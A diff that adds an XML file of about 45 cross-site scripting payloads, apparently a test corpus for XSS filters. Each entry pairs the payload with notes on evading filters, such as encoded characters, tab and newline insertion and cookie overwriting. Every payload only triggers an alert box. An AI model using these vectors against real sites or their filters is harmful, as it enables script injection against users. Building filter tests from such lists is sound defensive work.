@@ -1,0 +1,313 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<xss>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[<script>alert('CrossSiteScripting')</script>]]></code>
+		<desc>If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for XSS versus &amp;lt;XSS to see if it is vulnerable.</desc>
+		<label>Basic XSS Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[<SCRIPT>alert('CrossSiteScripting')</SCRIPT>]]></code>
+		<desc>Basic injection attack</desc>
+		<label>Basic XSS Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>base</element>
+		<code><![CDATA[<BASE HREF="javascript:alert('CrossSiteScripting');//">]]></code>
+		<desc>Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths.  If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>href</attribute>
+	</attack>
+	<attack>
+		<element>bgsound</element>
+		<code><![CDATA[<BGSOUND SRC="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>BGSOUND</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>body</element>
+		<code><![CDATA[<BODY BACKGROUND="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>BODY image</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>background</attribute>
+	</attack>
+	<attack>
+		<element>body</element>
+		<code><![CDATA[<BODY ONLOAD=alert('CrossSiteScripting')>]]></code>
+		<desc>BODY tag (I like this method because it doesn't require using any variants of "javascript:" or "SCRIPT..." to accomplish the XSS attack)</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>onload</attribute>
+	</attack>
+	<attack>
+		<element>div</element>
+		<code><![CDATA[<DIV STYLE="background-image: url(javascript:alert('CrossSiteScripting'))">]]></code>
+		<desc>Div background-image</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>div</element>
+		<code><![CDATA[<DIV STYLE="background-image: url(&amp;#1;javascript:alert('CrossSiteScripting'))">]]></code>
+		<desc>Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>div</element>
+		<code><![CDATA[<DIV STYLE="width: expression(alert('CrossSiteScripting'));">]]></code>
+		<desc>Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression"</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>frame</element>
+		<code><![CDATA[<FRAMESET><FRAME SRC="javascript:alert('CrossSiteScripting');"></FRAMESET>]]></code>
+		<desc>Frame (Frames have the same sorts of XSS problems as iframes).</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>iframe</element>
+		<code><![CDATA[<IFRAME SRC="javascript:alert('CrossSiteScripting');"></IFRAME>]]></code>
+		<desc>Iframe (If iframes are allowed there are a lot of other XSS problems as well).</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>input</element>
+		<code><![CDATA[<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>INPUT Image</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>type</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Image XSS using the JavaScript directive.</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC=javascript:alert('CrossSiteScripting')>]]></code>
+		<desc>No quotes and no semicolon</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG DYNSRC="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>IMG Dynsrc</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>dynsrc</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG LOWSRC="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>IMG Lowsrc</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>lowsrc</attribute>
+	</attack>
+	<attack>
+		<element>xss</element>
+		<code><![CDATA[exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("CrossSiteScripting"))'>]]></code>
+		<desc>IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC='vbscript:msgbox("CrossSiteScripting")'>]]></code>
+		<desc>VBscript in an image</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>meta</element>
+		<code><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>http-equiv</attribute>
+	</attack>
+	<attack>
+		<element>meta</element>
+		<code><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Meta with additional URL parameter. If the target website attempts to see if the URL contains an "http://" you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>http-equiv</attribute>
+	</attack>
+	<attack>
+		<element>param</element>
+		<code><![CDATA[<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>]]></code>
+		<desc>Using an OBJECT tag you can embed XSS directly (this is unverified).</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>value</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScripting'))">]]></code>
+		<desc>STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>xss</element>
+		<code><![CDATA[<XSS STYLE="xss:expression(alert('CrossSiteScripting'))">]]></code>
+		<desc>Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>style</attribute>
+	</attack>
+	<attack>
+		<element>style</element>
+		<code><![CDATA[<STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScripting')");}</STYLE><A CLASS=XSS></A>]]></code>
+		<desc>STYLE tag using background-image.</desc>
+		<label>HTML Element Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>style</element>
+		<code><![CDATA[<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScripting')")}</STYLE>]]></code>
+		<desc>STYLE tag using background.</desc>
+		<label>HTML Element Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>link</element>
+		<code><![CDATA[<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Stylesheet</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>href</attribute>
+	</attack>
+	<attack>
+		<element>table</element>
+		<code><![CDATA[<TABLE BACKGROUND="javascript:alert('CrossSiteScripting')"></TABLE>]]></code>
+		<desc>Table background (who would have thought tables were XSS targets... except me, of course).</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>background</attribute>
+	</attack>
+	<attack>
+		<element>td</element>
+		<code><![CDATA[<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScripting')"></TD></TABLE>]]></code>
+		<desc>TD background.</desc>
+		<label>HTML Element Attacks</label>
+		<attribute>background</attribute>
+	</attack>
+	<attack>
+		<element>meta</element>
+		<code><![CDATA[<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScripting')</SCRIPT>">]]></code>
+		<desc>Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).</desc>
+		<label>Other Attacks</label>
+		<attribute>content</attribute>
+	</attack>
+	<attack>
+		<element>br</element>
+		<code><![CDATA[<BR SIZE="&amp;{alert('CrossSiteScripting')}">]]></code>
+		<desc>&amp;JavaScript includes (works in Netscape 4.x).</desc>
+		<label>Other Attacks</label>
+		<attribute>size</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC=JaVaScRiPt:alert('CrossSiteScripting')>]]></code>
+		<desc>Case insensitive XSS attack vector.</desc>
+		<label>Character Encoding Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC=javascript:alert(&amp;quot;CrossSiteScripting&amp;quot;)>]]></code>
+		<desc>HTML entities (the semicolons are required for this to work).</desc>
+		<label>Character Encoding Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC=`javascript:alert("CrossSiteScripting")`>]]></code>
+		<desc>Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).</desc>
+		<label>Character Encoding Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[</TITLE><SCRIPT>alert("CrossSiteScripting");</SCRIPT>]]></code>
+		<desc>This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.</desc>
+		<label>Character Encoding Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>style</element>
+		<code><![CDATA[<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScripting")';</STYLE>]]></code>
+		<desc>STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).</desc>
+		<label>Character Encoding Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="jav	ascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Embedded tab to break up the cross site scripting attack.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="jav&amp;#x09;ascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="jav&amp;#x0A;ascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="jav&amp;#x0D;ascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC=" &amp;#14;  javascript:alert('CrossSiteScripting');">]]></code>
+		<desc>Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal).</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>img</element>
+		<code><![CDATA[<IMG SRC="javascript:alert('CrossSiteScripting')"]]></code>
+		<desc>Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the "javascript:" directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
+	/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/
+As a side note, this was also effective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute>src</attribute>
+	</attack>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[<SCRIPT>alert("CrossSiteScripting");//<</SCRIPT>]]></code>
+		<desc>(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[<IMG """><SCRIPT>alert("CrossSiteScripting")</SCRIPT>">]]></code>
+		<desc>Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute></attribute>
+	</attack>
+	<attack>
+		<element>script</element>
+		<code><![CDATA[<SCRIPT>a=/CrossSiteScripting/alert(a.source)</SCRIPT>]]></code>
+		<desc>No single quotes or double quotes or semicolons.</desc>
+		<label>Embedded Character Attacks</label>
+		<attribute></attribute>
+	</attack>
+</xss>
